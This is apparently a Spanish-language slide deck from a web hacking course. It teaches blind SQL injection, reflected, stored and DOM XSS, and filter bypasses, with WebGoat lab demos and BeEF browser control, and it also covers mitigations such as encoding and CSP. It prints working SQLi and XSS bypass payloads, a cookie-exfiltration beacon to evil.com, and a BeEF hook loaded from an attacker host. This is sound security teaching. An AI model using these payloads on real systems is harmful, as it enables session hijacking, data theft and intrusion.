# Deck — Clase 2 · Módulo 2

> Curso de Web Hacking
> Duración: 2 horas
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 2 — Clase 2
### Blind SQLi, XSS, contextos de ejecución y control del navegador

---

## Recap breve: Clase 1

- SQLi = la base de datos ejecuta datos como consulta
- El contexto (string vs numérico) define cómo armar el payload
- UNION SELECT para extraer datos de otras tablas
- SQLMap automatiza, pero primero hay que entender la falla
- Command Injection, File Inclusion y CSRF comparten la misma causa raíz: **datos mezclados con instrucciones**

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | Blind SQL Injection: boolean y time-based | ~25 min |
| **2** | XSS: fundamentos, tipos y contextos | ~35 min |
| 🧪 | Demo 1: Reflected XSS en WebGoat | ~20 min |
| **3** | DOM XSS, bypass de filtros y payloads | ~25 min |
| 🧪 | Demo 2: DOM XSS en WebGoat | ~20 min |
| **4** | BeEF: control del navegador post-XSS | ~15 min |
| 🏁 | Desafío + cierre del módulo | ~5 min |

---

## Blind SQL Injection

A veces no vemos errores ni resultados directos.
La app no muestra datos de la base, pero **sí cambia su comportamiento** según la consulta.

Dos técnicas:
- **Boolean-based:** la respuesta cambia (contenido, tamaño, redirección)
- **Time-based:** el servidor tarda más si la condición es verdadera

La explotación es más lenta, pero el impacto es el mismo.

---

## Blind SQLi: Boolean-based

Observamos diferencias en la respuesta para inferir datos **un carácter a la vez**:

```sql
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
...
' AND (SELECT COUNT(*) FROM users) > 5 --
```

Lógica:
- Si la condición es **verdadera** → respuesta normal
- Si es **falsa** → respuesta distinta (error, vacía, redirección)

Con suficientes requests, reconstruimos el valor completo.

---

## Blind SQLi: Time-based

Cuando ni siquiera hay diferencias visibles en la respuesta, medimos **tiempos**:

```sql
' AND IF(database()='app_db', SLEEP(5), 0) --
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

Con curl para medir:

```bash
time curl -s "http://target/product?id=1' AND SLEEP(5)--"
```

Si tarda ~5 segundos → condición verdadera.
Si responde rápido → condición falsa.

Es lento, pero funciona incluso cuando no hay **ningún** output visible.

---

## Cross-Site Scripting (XSS)

**XSS** ocurre cuando una aplicación permite que contenido controlado por un atacante sea interpretado por el navegador de otra persona.

El problema no es JavaScript en sí.

El problema es no distinguir entre:
1. **Datos legítimos**
2. **Código ejecutable**

Cuando esa distinción falla, el navegador ejecuta instrucciones que nunca debieron estar ahí.

---

## ¿Por qué XSS sigue en el OWASP Top 10?

- Afecta al **lado cliente** — muchos devs solo protegen el servidor
- Los frameworks modernos mitigan *algunos* casos, pero no todos
- DOM XSS no pasa por el backend → escapa a validaciones server-side
- El impacto real va mucho más allá de un `alert()`

---

## Contextos de ejecución

No todo payload funciona en todos los lugares. El navegador interpreta distinto según dónde caiga el input:

| Contexto | Ejemplo vulnerable | Payload |
|---|---|---|
| **HTML** | `<p>Hola INPUT</p>` | `<script>alert(1)</script>` |
| **Atributo** | `<img src="INPUT">` | `" onerror="alert(1)` |
| **JavaScript** | `var x = 'INPUT';` | `';alert(1);//` |
| **URL/href** | `<a href="INPUT">` | `javascript:alert(1)` |

La regla: **identificar el contexto antes de armar el payload**.

---

## Cómo detectar XSS: metodología

1. Encontrar puntos de entrada (parámetros GET, POST, headers, fragmentos)
2. Inyectar un string único de prueba (canary): `xss123test`
3. Buscar dónde se refleja en la respuesta
4. Determinar el contexto (HTML, atributo, JS, DOM)
5. Armar el payload acorde al contexto
6. Confirmar ejecución

Con curl para detectar reflexión:

```bash
# Inyectar canary y buscar en la respuesta
curl -s "http://target/search?q=xss123test" | grep "xss123test"

# Ver en qué contexto cae
curl -s "http://target/search?q=xss123test" | grep -B2 -A2 "xss123test"
```

---

## XSS Reflejado (Reflected XSS)

El payload:
1. Sale del navegador (en la URL o body)
2. Llega al servidor
3. Vuelve inmediatamente en la respuesta sin sanitizar

Típico en:
- Buscadores internos
- Mensajes de error
- Parámetros GET/POST reflejados
- Páginas de resultados

Ejemplo:

```
https://sitio.com/buscar?q=<script>alert('XSS')</script>
```

---

## XSS Persistente (Stored XSS)

El payload se **almacena** en el servidor (DB, archivo, log) y se ejecuta cada vez que alguien accede al contenido.

Aparece en:
- Comentarios y foros
- Perfiles de usuario
- Mensajes privados
- Paneles de administración (logs)
- Campos que se renderizan en otros contextos

Impacto: afecta a **múltiples víctimas** sin que el atacante intervenga de nuevo.

---

## XSS basado en DOM (DOM XSS)

La vulnerabilidad está en el JavaScript del **cliente**. El servidor puede comportarse correctamente.

El modelo mental:

```
SOURCE (de dónde viene el dato) → SINK (dónde se ejecuta)
```

Sources comunes:
- `location.hash`, `location.search`
- `document.URL`, `document.referrer`
- `window.name`, `postMessage`

Sinks peligrosos:
- `innerHTML`, `outerHTML`
- `document.write()`
- `eval()`, `setTimeout(string)`, `Function()`
- `element.src`, `element.href`

---

## DOM XSS: ejemplo concreto

Código vulnerable:

```javascript
// Source: location.hash
var input = document.location.hash.substring(1);
// Sink: innerHTML
document.getElementById('output').innerHTML = input;
```

Explotación:

```
http://target/page#<img src=x onerror=alert(document.cookie)>
```

El servidor nunca ve el payload (está después del `#`). Solo el navegador lo procesa.

---

## Comparativa de tipos

| Pregunta | Reflected | Stored | DOM |
|---|---|---|---|
| ¿Pasa por servidor? | Sí | Sí (se guarda) | No necesariamente |
| ¿Dónde está la falla? | Renderizado server-side | Almacenamiento + renderizado | JavaScript del cliente |
| ¿Cómo lo investigás? | Request/response | Buscar dónde se almacena | DevTools + sources + DOM |
| ¿Persistente? | No | Sí | Depende del source |
| ¿Víctimas? | 1 por click | Todas las que accedan | 1 por click (generalmente) |

---

## 🧪 Demo guiada 1 — Reflected XSS en WebGoat

**Target:** `Cross Site Scripting → Try It! Reflected XSS`

Pasos:
1. Abrir WebGoat → módulo Cross Site Scripting → pantalla 7
2. Probar valores normales en los campos del formulario
3. Inyectar el canary `test123` y ver dónde se refleja
4. Probar payload según contexto:

```html
"><script>alert('XSS')</script>
```

5. Identificar el campo vulnerable
6. Explicar por qué ese campo y no el otro

---

## Entregables del lab

Lo que deberían documentar:
- Captura del `alert('XSS')` ejecutándose
- Nombre del campo vulnerable
- Recomendación breve de mitigación

Mitigaciones esperadas:
- Escape/encoding según contexto (HTML entities, JS escape, URL encode)
- No insertar input crudo en HTML
- CSP como defensa en profundidad (no como parche único)
- Frameworks con auto-escape por defecto (React, Angular)

---

## Bypass de filtros

Muchos filtros fallan porque hacen blacklist de patrones obvios:
- Bloquean `<script>` → pero no `<img onerror=...>`
- Bloquean `alert` → pero no `confirm`, `prompt`, `fetch`
- Bloquean comillas → pero no backticks en template literals

Payloads de bypass comunes:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## Bypass: encoding y ofuscación

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Sin paréntesis (bypass WAF) -->
<img src=x onerror=alert`1`>

<!-- Sin comillas ni espacios -->
<svg/onload=alert(1)>

<!-- Evento con tab/newline -->
<img src=x	onerror
=alert(1)>
```

La seguridad por blacklist es frágil: el navegador tiene **muchas formas válidas** de ejecutar código.

---

## Herramientas para encontrar XSS

| Herramienta | Uso |
|---|---|
| **Burp Suite Repeater** | Manipular parámetros y ver reflexión en respuesta |
| **DevTools → Elements** | Ver dónde se inserta el input en el DOM |
| **DevTools → Sources** | Leer el JavaScript que maneja el input |
| **DevTools → Console** | Probar payloads directo |
| `curl + grep` | Detectar reflexión automatizada |
| **dalfox** | Scanner de XSS automatizado |

```bash
# dalfox básico
dalfox url "http://target/search?q=test" --blind your.xss.ht

# Con pipe desde parámetros descubiertos
echo "http://target/page?name=test" | dalfox pipe
```

---

## 🧪 Demo guiada 2 — DOM XSS en WebGoat

**Target:** `Cross Site Scripting → Identify potential for DOM-Based XSS` (pantalla 10-11)

Pasos:
1. Abrir DevTools → Sources
2. Revisar el JavaScript que procesa la URL
3. Identificar el **source** (¿qué parte de la URL se lee?)
4. Identificar el **sink** (¿dónde se inserta?)
5. Modificar la URL con un texto de prueba
6. Construir payload DOM XSS:

```
http://target/WebGoat/start.mvc#test/<script>alert('DOM-XSS')</script>
```

---

## Después de la demo: diferencias clave

| Aspecto | Reflected XSS | DOM XSS |
|---|---|---|
| Herramienta principal | Burp / curl | DevTools |
| Evidencia | Response del servidor contiene el payload | El DOM contiene el payload |
| Detección automatizada | Fácil (scanners) | Difícil (requiere análisis de JS) |
| Fix | Escape server-side | Sanitizar en el JS del cliente |

---

## Impacto real de XSS

Con XSS no solo mostrás un `alert(1)`.

Un atacante puede:
- Robar cookies/tokens: `new Image().src='http://evil.com/?c='+document.cookie`
- Capturar credenciales: inyectar formulario falso
- Keylogger: registrar todo lo que escribe la víctima
- Redirigir: `location='http://phishing.com'`
- Ejecutar acciones como la víctima: requests AJAX con su sesión
- Escalar: hookear el navegador para pivotear

Por eso `alert()` es **prueba de ejecución**, no el objetivo final.

---

## Control del navegador con BeEF

Si logramos ejecutar JavaScript, el navegador se convierte en una **plataforma de control**.

BeEF (Browser Exploitation Framework) demuestra post-explotación:
- Interacción con el DOM
- Captura de credenciales
- Reconocimiento de red interna (desde el navegador)
- Ingeniería social (alertas, pop-ups falsos)
- Detección de plugins y versión del browser

---

## BeEF: cómo funciona

1. El atacante inyecta un **hook** (script JS que conecta al panel BeEF):

```html
<script src="http://attacker:3000/hook.js"></script>
```

2. La víctima ejecuta el hook (via XSS)
3. El navegador de la víctima se conecta al panel de BeEF
4. El atacante ejecuta módulos desde el panel:
   - Obtener cookies
   - Detectar software instalado
   - Capturar formularios
   - Escanear red interna
   - Social engineering (fake login, fake update)

---

## Qué demuestra BeEF en clase

BeEF rompe dos ideas ingenuas:

1. *"Fue solo un alert, no pasa nada"* → se puede escalar a robo de sesión completo
2. *"Si no toqué el servidor, el impacto es bajo"* → el navegador es un entorno de ejecución poderoso

Un XSS puede ser el punto de entrada para:
- Secuestro de sesión
- Pivoteo dentro de la red (el browser de la víctima como proxy)
- Abuso de confianza del usuario
- Encadenamiento con CSRF u otras fallas

---

## Mitigaciones contra XSS

| Capa | Técnica |
|---|---|
| **Output encoding** | Escapar según contexto: HTML entities, JS escape, URL encode |
| **Input validation** | Allowlists cuando el formato es predecible |
| **CSP** | `Content-Security-Policy: default-src 'self'` bloquea inline scripts |
| **HTTPOnly cookies** | Previene robo de sesión vía `document.cookie` |
| **Framework auto-escape** | React, Angular, Vue escapan por defecto (excepto `dangerouslySetInnerHTML`) |
| **DOM sanitization** | DOMPurify para contenido dinámico en el cliente |

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

## Desafío — Para casa

Objetivo:
- Repetir y profundizar el DOM XSS del módulo WebGoat (pantalla 11)
- Encontrar el parámetro vulnerable sin ayuda
- Construir un payload que ejecute `alert()`

Entrega sugerida:
1. Parámetro vulnerable identificado
2. Payload usado
3. Captura/evidencia de ejecución
4. Explicación del source y sink involucrados

---

## Cierre del módulo 2

Si tuvieras que resumir este módulo en una sola frase:

> **Entender cómo interpreta datos cada componente te permite anticipar la explotación.**

En este módulo vimos:
- Base de datos interpretando datos como SQL (SQLi)
- Sistema interpretando datos como comandos (Command Injection)
- Servidor interpretando rutas como archivos (File Inclusion)
- Navegador interpretando datos como JavaScript (XSS)
- Navegador autenticado ejecutando acciones no intencionadas (CSRF)

Ese patrón se repite una y otra vez en seguridad web.
